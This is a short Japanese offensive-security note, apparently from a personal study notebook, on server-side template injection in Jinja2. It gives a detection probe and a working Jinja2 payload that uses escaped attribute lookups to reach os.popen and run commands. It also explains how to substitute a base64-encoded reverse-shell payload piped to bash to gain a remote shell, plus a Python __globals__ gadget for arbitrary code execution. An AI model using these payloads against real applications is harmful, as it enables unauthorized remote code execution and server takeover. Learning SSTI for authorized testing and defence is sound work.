---
tags:
  - Offensive
---
# サーバーサイドテンプレートインジェクション(SSTI)

Webアプリのサーバーで実行される、テンプレートエンジンに悪意のあるコードを埋め込む攻撃。テンプレートとなるHTMLを用意し、ユーザーの入力やデータベース等から読み込んだデータから動的に生成する仕組みを悪用する。ユーザーが入力できるところ（フォーム、リクエストヘッダー等）にテンプレート文字列を渡し、サーバーで実行されシェル獲得等ができる。

## ペイロード

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
### [[Jinja2]]

- 検証用
	`{{7*7}}`
	どこかにこの実行結果である*49*と表示されていれば、SSTI可能。
- [[ReverseShell]]
```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
*id*コマンドの代わりに、[[ReverseShell]]のペイロードを*Base64*にして`echo -n <Base64> | base64 -d | bash`を入れると、[[ReverseShell]]を獲得できる。

> Pythonでは、メソッドか関数から`__globals__`を伝うことで任意のコードを実行できる？
> `func.__globals__['__builtins__'].__import__('os').popen('id').read()`



---

## 参照

1. https://www.youtube.com/watch?v=DYp9TFnZH-g